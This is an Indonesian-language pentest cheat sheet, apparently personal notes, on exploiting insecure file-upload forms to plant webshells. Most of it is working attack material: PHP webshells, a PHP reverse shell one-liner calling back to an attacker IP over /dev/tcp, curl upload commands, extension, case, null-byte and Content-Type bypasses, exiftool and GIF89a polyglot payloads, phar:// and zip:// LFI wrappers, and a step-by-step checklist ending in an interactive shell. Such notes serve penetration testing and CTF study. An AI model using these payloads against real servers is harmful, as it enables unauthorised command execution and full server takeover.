# 📤 File Upload — Mengunggah Webshell ke Server

> **Tujuan:** Mengeksploitasi fitur upload file yang tidak aman untuk menaruh **webshell** dan mendapatkan akses eksekusi perintah di server.

---

## 📌 Penjelasan Singkat

Kerentanan File Upload terjadi ketika aplikasi **tidak memvalidasi tipe, ekstensi, atau konten** file yang di-upload. Dampaknya: webshell, defacement, atau bahkan full server takeover.

---

## 🔍 Ciri-Ciri Aplikasi Rentan

- Form upload menerima file tanpa validasi ekstensi.
- Server menyimpan file di lokasi yang dapat diakses publik (mis. `/uploads/`).
- Tidak ada Content-Type validation atau MIME check.
- Tidak ada sanitasi nama file.
- File hasil upload dapat diakses langsung via URL.

---

## 🎯 Tujuan Utama

Mengunggah file yang **dieksekusi sebagai script** oleh web server:

| Bahasa | Ekstensi Umum |
|--------|---------------|
| PHP    | `.php`, `.phtml`, `.php3`, `.php5`, `.phar` |
| ASP    | `.asp`, `.aspx` |
| JSP    | `.jsp`, `.jspx` |
| Python | `.py` (CGI) |
| Perl   | `.pl` (CGI) |

---

## 🪜 Langkah Eksploitasi

### Step 1: Siapkan Webshell

#### PHP Webshell Minimal

```php
<?php system($_GET['cmd']); ?>
```

#### PHP Webshell Interaktif

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
}
?>
```

#### PHP Reverse Shell (one-liner)

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1'"); ?>
```

Simpan sebagai `shell.php`.

---

### Step 2: Upload ke Target

```bash
curl -F "file=@shell.php" http://<TARGET>/upload.php
# atau via form biasa di browser
```

Catat **path hasil upload** (mis. `/uploads/shell.php`).

---

### Step 3: Eksekusi Perintah

```text
http://<TARGET>/uploads/shell.php?cmd=id
http://<TARGET>/uploads/shell.php?cmd=whoami
http://<TARGET>/uploads/shell.php?cmd=uname+-a
```

**Response vulnerable:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux victim 5.15.0-... #1 SMP ...
```

---
## 🛡️ Teknik Bypass Filter

### 1. Bypass Blacklist Ekstensi

```text
shell.phtml
shell.php3
shell.php4
shell.php5
shell.php7
shell.phar
shell.pht
```

> **Penjelasan:** Apache bisa dikonfigurasi memproses banyak ekstensi sebagai PHP. Cek `httpd.conf` jika ada LFI.

### 2. Bypass Whitelist dengan Double Extension

```text
shell.jpg.php
shell.php.jpg
```

> Apache dengan `AddHandler application/x-httpd-php .php` akan **mengeksekusi** `shell.jpg.php` sebagai PHP.

### 3. Case Sensitivity Bypass

```text
shell.pHp
shell.PhP
shell.PHP
```

### 4. Null Byte (PHP < 5.3.4)

```text
shell.php%00.jpg
```

> Server simpan sebagai `shell.jpg`, tapi PHP parse sebagai `shell.php`.

### 5. Semicolon Bypass (IIS + PHP)

```text
shell.asp;.jpg
shell.php;.jpg
```

### 6. Path Traversal di Nama File

```text
..\shell.php
../../shell.php
```

---

## 🖼️ Bypass Content-Type Validation

Server cek `Content-Type` dari request header, bukan isi file. Override dengan:

```bash
curl -F "file=@shell.php;type=image/jpeg" http://<TARGET>/upload.php
```

Header yang umum dipakai:

```text
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

---

## 🎥 Bypass MIME / Magic Number Validation

Server validasi **isi file** (bukan ekstensi). Sisipkan PHP code di metadata JPEG:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
mv shell.jpg shell.php.jpg
```

> `getimagesize()` lolos karena file masih valid JPEG.

### Polyglot File (GIF + PHP)

```bash
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

> Magic bytes `GIF89a` di awal membuat MIME validator lolos. Server tetap mengeksekusi sebagai PHP.

---

## 🔓 Upload + LFI Combination

Jika server hanya menerima gambar, gunakan PHP wrapper via LFI:

```text
?page=phar://./uploads/shell.jpg/shell.php
?page=zip://./uploads/shell.zip#shell.php
```

---

## 🛠️ Tools Bantu

### Burp Suite (Intercept Upload)

```text
1. Upload file ke target
2. Intercept request di Burp
3. Ubah ekstensi / Content-Type / payload
4. Forward request yang sudah dimodifikasi
```

### Fuxploider (Python)

```bash
git clone https://github.com/almandin/fuxploider.git
cd fuxploider
pip3 install -r requirements.txt
python3 fuxploider.py -u http://<TARGET>/upload.php --not-found-url "404"
```

---

## 📋 Tabel Ringkasan Bypass

| Filter | Bypass |
|--------|--------|
| Blacklist ekstensi | `.phtml`, `.phar`, `.php3` |
| Whitelist ekstensi | `shell.jpg.php` (double ext) |
| Case sensitive | `.PhP`, `.pHP` |
| MIME Content-Type | `type=image/jpeg` di curl |
| Magic number | GIF89a prefix / exiftool comment |
| Upload saja | Upload + LFI `phar://` |

---

## ⚠️ Catatan Penting

- **Cek permission folder upload**: Folder harus executable untuk PHP dijalankan.
- **Cek `.htaccess`**: Kadang `/uploads/` punya `.htaccess` yang disable PHP.
- **Disable_functions**: `system()`, `exec()` mungkin di-disable → coba `passthru()`, `shell_exec()`, `popen()`.
- **WAF / AV**: Beberapa target scan file upload dengan antivirus.
- **Rename file**: Beberapa server rename file hasil upload, cek response JSON/HTML untuk path barunya.

---

## ✅ Checklist File Upload

- [ ] Identifikasi endpoint upload (`/upload.php`, form).
- [ ] Coba upload file gambar biasa (test baseline).
- [ ] Coba upload webshell `.php` polos.
- [ ] Jika gagal, bypass Content-Type header.
- [ ] Coba ekstensi alternatif (`.phtml`, `.phar`, `.php3`).
- [ ] Coba double extension (`.jpg.php`).
- [ ] Jika hanya gambar yang boleh, buat polyglot (GIF89a / exiftool).
- [ ] Eksekusi via URL langsung atau LFI wrapper (`phar://`).
- [ ] Dapatkan shell interaktif (reverse shell).
- [ ] Stabilize TTY.

---

## 📚 Referensi

- [OWASP – File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PayloadsAllTheThings – Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks – File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [fuxploider](https://github.com/almandin/fuxploider)
